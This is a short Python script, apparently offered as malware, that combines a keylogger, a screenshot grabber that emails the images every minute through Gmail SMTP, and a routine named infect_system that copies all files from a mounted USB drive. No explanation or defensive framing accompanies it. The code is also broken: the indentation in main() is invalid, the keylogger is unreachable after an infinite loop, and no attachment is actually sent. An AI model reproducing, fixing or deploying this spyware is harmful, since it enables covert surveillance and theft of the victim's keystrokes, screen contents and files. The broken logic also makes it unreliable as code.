import os
import shutil
import smtplib
import subprocess
import time
from PIL import ImageGrab
from pynput.keyboard import Listener


email_address = "your_email@gmail.com"
email_password = "your_password"

def infect_system():
    
    usb_drive = "/media/pi"  
    for root, dirs, files in os.walk(usb_drive):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                shutil.copy(file_path, "/path/to/destination")  
            except Exception as e:
                pass

def send_email(subject, body, attachment=None):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email_address, email_password)
        message = f"Subject: {subject}\n\n{body}"
        if attachment:
            filename = os.path.basename(attachment)
            with open(attachment, "rb") as file:
                message += f"\n\nAttached: {filename}"
                server.sendmail(email_address, email_address, message)
        else:
            server.sendmail(email_address, email_address, message)
        server.quit()
    except Exception as e:
        pass

def record_keystrokes(key):
    
    try:
        with open("keystrokes.txt", "a") as f:
            f.write(str(key) + "\n")
    except Exception as e:
        pass

def capture_screenshot():
    
    try:
        screenshot = ImageGrab.grab()
        screenshot.save("screenshot.png")
        send_email("Screenshot", "Check out this screenshot!", "screenshot.png")
    except Exception as e:
        pass

def main():
    
    infect_system()
    
        while True:
        capture_screenshot()
        time.sleep(60)  

        with Listener(on_press=record_keystrokes) as listener:
        listener.join()

if __name__ == "__main__":
    main()
